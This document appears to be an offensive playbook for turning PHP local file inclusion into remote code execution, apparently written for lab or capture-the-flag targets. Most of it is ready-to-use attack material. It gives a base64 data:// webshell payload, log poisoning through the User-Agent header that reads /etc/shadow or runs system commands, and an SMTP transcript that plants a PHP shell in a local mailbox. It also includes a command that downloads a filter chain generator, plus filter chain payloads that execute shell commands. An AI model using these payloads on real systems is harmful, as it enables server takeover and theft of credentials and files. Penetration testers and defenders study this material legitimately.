# LFI → RCE (PHP Wrappers, Log Poisoning, Filter Chain)

## When this applies

- Path traversal reaches `include()` / `require()` rather than `file_get_contents()`.
- PHP-specific include semantics enable RCE via wrappers, log poisoning, or filter chain generation.
- Goal: escalate file-read to remote code execution.

## Technique

Three primary paths:
1. **PHP wrappers** — `php://filter`, `data://`, `expect://`, `php://input` for code execution.
2. **Log poisoning** — inject PHP into logs via User-Agent, then include the log.
3. **Filter chain RCE** — when you control the include path, generate a filter chain that synthesizes arbitrary PHP code.

## Steps

### PHP include wrappers

```
# File wrapper
?file=file:///etc/passwd

# PHP wrapper (read as base64 — bypasses PHP execution)
?file=php://filter/convert.base64-encode/resource=/etc/passwd

# Data wrapper (inject PHP code)
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+

# Expect wrapper (if enabled)
?file=expect://whoami

# Input wrapper (POST body = PHP code)
?file=php://input
```

**IMPORTANT**: PHP wrappers (`php://filter`, `data://`, `php://input`) are blocked when the code uses `file_exists()` before `include()` — `file_exists('php://filter/...')` returns `false`. Use log poisoning or session injection instead.

### LFI to RCE via log poisoning

When path traversal uses `include()`/`require()`, escalate to Remote Code Execution:

**Step 1 — Inject PHP into access log via User-Agent:**
```bash
curl -s "http://target/" -H "User-Agent: <?php echo file_get_contents('/etc/shadow'); ?>"
```

**Step 2 — Include the poisoned log:**
```bash
curl "http://target/page.php?file=../../../../var/log/apache2/access.log"
```

**Critical log poisoning rules:**
1. **Use `file_get_contents()` to read files** — if the target file has invalid PHP syntax (e.g., `<?php TOKEN_VALUE ?>`), `include()` causes a fatal parse error. Read it as text instead.
2. **Clean log required** — any prior failed PHP injection attempts corrupt the log permanently with broken `<?` sequences. Every subsequent `include()` will fatal-error. Restart the service for a clean log.
3. **One-shot approach** — inject payload in one request, include log in the next. Don't send intermediate requests that pollute the log.
4. **Quote safety** — Apache combined log format only backslash-escapes `"` and `\` in client-supplied fields. Anything else (including `<`, `>`, `?`, `=`, `(`, `)`, semicolons, single quotes) is logged verbatim. Payloads built entirely from non-escaped chars — e.g. `<?=system($_REQUEST[1])?>` — survive intact and let you trigger commands by adding `&1=cat /root/root.txt` to the include URL. Avoid double quotes inside the payload; they get backslash-escaped and break the PHP tag.
5. **`short_open_tag` hazard** — if `short_open_tag=On`, any `<?` anywhere in the log (even in URLs) is parsed as PHP. This commonly causes fatal errors when including logs.

**Common log paths:**
```
/var/log/apache2/access.log    # Debian/Ubuntu
/var/log/httpd/access_log      # CentOS/RHEL
/var/log/nginx/access.log      # Nginx
/proc/self/fd/1                # Docker stdout
```

**Alternative LFI vectors when log poisoning fails:**
- **Session injection**: Write PHP into session via controlled input → include `/tmp/sess_SESSIONID`
- **Mailbox poisoning**: SMTP a PHP payload to a local user → include their **mbox spool** (see below)
- **Mail log**: Send email with PHP body → include `/var/log/mail.log`
- **Env injection**: Set PHP in HTTP headers → include `/proc/self/environ`
- **Temp file**: Upload file → include `/tmp/phpXXXXXX` (race condition)

#### Mailbox poisoning (SMTP → local mbox → LFI include)

When port 25 is reachable and the target has a local user matching the LFI vhost's PHP-FPM owner (e.g., `php7.x-fpm-<USER>.sock`), the user's spooled mail file is includable as PHP.

```
# Try the canonical spool path first; /var/mail/<USER> is often a symlink
# that hygiene loops or `mail` clients periodically truncate.
/var/spool/mail/<USER>            # canonical mbox — prefer this
/var/mail/<USER>                  # often a symlink; less stable
```

SMTP transcript (raw socket — many Debian/Postfix boxes refuse `<USER>@<DOMAIN>` with "Relay access denied" while accepting `<USER>@localhost`):

```
HELO a
MAIL FROM:<a@b.c>
RCPT TO:<<USER>@localhost>          # localhost recipient bypasses relay-denial when domain-form fails
DATA
Subject: x

<?php system($_GET["c"]); ?>
.
QUIT
```

LFI request (URL-encode the `&` so the PHP body's `$_GET["c"]` is a separate param):

```
GET /index.php?page=....//....//....//....//var/spool/mail/<USER>&c=id
```

Tips:
- The mbox is appended to, so old PHP payloads remain — they execute every time, but with empty `$_GET["c"]` they're silent. New mail just adds another `<?php ... ?>` block.
- If the mbox is being cleared and you can't keep it populated, `/var/spool/mail/<USER>` survives `mail` reads that move `/var/mail/<USER>` to `~/mbox`. Always try the spool path before assuming SMTP delivery is broken.
- PHP ignores everything outside `<?php ... ?>` so headers like `Subject:` and `Received:` are harmlessly skipped.

### PHP filter chain RCE (controlled include path)

When you **fully control** the `include()`/`require()` path (not just traversal from a base directory), use PHP filter chain generation to synthesize arbitrary PHP code without needing `allow_url_include`:

```bash
# Download and generate filter chain with Synacktiv's php_filter_chain_generator.py:
curl -sL https://raw.githubusercontent.com/synacktiv/php_filter_chain_generator/main/php_filter_chain_generator.py -o /tmp/php_filter_chain_generator.py
python3 /tmp/php_filter_chain_generator.py --chain '<?=`cat /opt/flag.txt`;die;?>'
# Output: php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|...
```

**How it works:** Chained `convert.iconv` filters manipulate byte sequences to construct arbitrary PHP code byte-by-byte. When `include()` evaluates the `php://filter/...` chain, it produces and executes the PHP code. This bypasses `allow_url_include = Off` because `php://filter` is a stream wrapper, not a URL.

**Practical constraints:**
- **Apache header size limit ~8190 chars** — chains are long. Use the shortest possible PHP payload with backtick short-tag syntax: `<?=`cmd`?>` instead of `<?php system('cmd'); ?>`
- **Blocked by `file_exists()`** — same as all PHP wrappers
- **Appended suffixes** — if code does `include($path . '/file.php')`, the suffix is absorbed harmlessly by `php://temp`
- **All required inputs must be present** — if the vulnerable code reads multiple headers/params before reaching the `include()` statement, all must have valid values or execution never reaches the vulnerable line

**Common scenarios:**
- CMS plugin loads modules via user-controlled header/parameter → set the path to the filter chain
- Framework route maps a URL segment to a template include → inject filter chain in the URL
- Application reads a config path from an HTTP header → set header to filter chain

### Post-exploitation enumeration

```
- LFI escalation: If include()/require() is used, attempt log poisoning for RCE
- Read files with invalid PHP: Use file_get_contents() in injected code for files that would cause parse errors when included directly
- Document all findings with evidence
```

## Verifying success

- Out-of-band callback (DNS / HTTP) confirms code execution.
- Inline output of `id` / `whoami` appears in response.
- Filter chain generates the expected output (cat /opt/flag.txt content).

## Common pitfalls

- `allow_url_include = Off` blocks `data://` / `php://input` — try filter chain or log poisoning.
- Some apps wrap the include path with a fixed prefix/suffix — wrap the wrapper accordingly.
- Logs may be rotated mid-attack — re-inject after rotation.

## Tools

- Synacktiv `php_filter_chain_generator.py`
- Burp Suite Repeater
- Burp Collaborator
- Custom Python (build filter chains, inject)
